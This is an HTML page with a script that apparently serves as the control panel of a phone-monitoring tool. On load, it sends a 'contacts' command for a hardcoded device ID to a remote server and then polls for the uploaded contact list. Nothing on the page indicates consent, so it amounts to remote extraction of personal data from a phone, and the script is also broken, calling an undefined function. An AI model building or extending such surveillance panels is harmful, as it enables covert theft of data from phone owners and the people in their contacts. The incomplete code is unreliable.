<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Contact List</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        body {
            background-color: #0f0f0f;
            background-image: linear-gradient(45deg, #000000, #1a1a1a);
            color: #fff;
            font-family: 'Segoe UI', sans-serif;
            padding: 20px;
            display: flex; flex-direction: column; align-items: center;
        }

        .container {
            width: 100%; max-width: 500px;
        }

        /* Back Button */
        .header {
            display: flex; align-items: center; gap: 15px; margin-bottom: 20px;
            background: rgba(255, 255, 255, 0.1); padding: 15px; border-radius: 15px;
        }
        .back-btn {
            color: white; text-decoration: none; font-size: 1.2rem;
            background: #333; height: 40px; width: 40px; border-radius: 50%;
            display: flex; align-items: center; justify-content: center;
        }

        /* Status Box */
        .status-box {
            text-align: center; padding: 10px; margin-bottom: 15px;
            background: rgba(0, 255, 136, 0.1); border: 1px solid #00ff88;
            color: #00ff88; border-radius: 10px; font-size: 0.9rem;
            display: none; /* Initially hidden */
        }

        /* Contact List */
        .contact-list {
            list-style: none; padding: 0; margin: 0;
            background: rgba(255, 255, 255, 0.05); border-radius: 15px;
            overflow: hidden;
        }
        .contact-item {
            display: flex; justify-content: space-between; align-items: center;
            padding: 15px; border-bottom: 1px solid rgba(255,255,255,0.1);
        }
        .contact-item:last-child { border-bottom: none; }
        
        .name { font-weight: bold; font-size: 1rem; }
        .number { color: #aaa; font-size: 0.85rem; margin-top: 4px; }
        
        .call-btn {
            background: #4caf50; color: white; border: none;
            padding: 8px 15px; border-radius: 20px; cursor: pointer;
            font-size: 0.8rem;
        }

        .refresh-btn {
            background: #2196F3; color: white; border: none; padding: 12px;
            width: 100%; border-radius: 10px; margin-top: 20px; cursor: pointer;
            font-weight: bold; font-size: 1rem;
        }
    </style>
</head>
<body>

    <div class="container">
        <div class="header">
            <a href="index.html" class="back-btn"><i class="fa-solid fa-arrow-left"></i></a>
            <h2 style="margin:0;">Contacts</h2>
        </div>

        <div id="statusMsg" class="status-box">Requesting Contacts...</div>

        <ul id="contactsUl" class="contact-list">
            <li class="contact-item" style="justify-content:center; color:#777;">
                Click "Load Data" to fetch
            </li>
        </ul>

        <button class="refresh-btn" onclick="fetchContacts()">
            <i class="fa-solid fa-rotate-right"></i> Load / Refresh Data
        </button>
    </div>

    <script>
        const SERVER_URL = "https://child-v9no.onrender.com";
        const DEVICE_ID = "M2103K19I"; // Tumhara Sahi ID

        // 1. Page khulte hi Command bhejo
        window.onload = function() {
            showStatus("Requesting contacts from phone...");
            
            fetch(`${SERVER_URL}/api/send-command`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ device_id: DEVICE_ID, command: 'contacts' })
            })
            .then(res => res.json())
            .then(data => {
                showStatus("Command Sent! Waiting for upload...");
                // 5 Second baad automatically data check karega
                setTimeout(fetchContacts, 5000);
            });
        };

            showStatus("Checking server for file...");
            
            // Note: Hum maan ke chal rahe hain server 'contacts.json' naam se file save karta hai
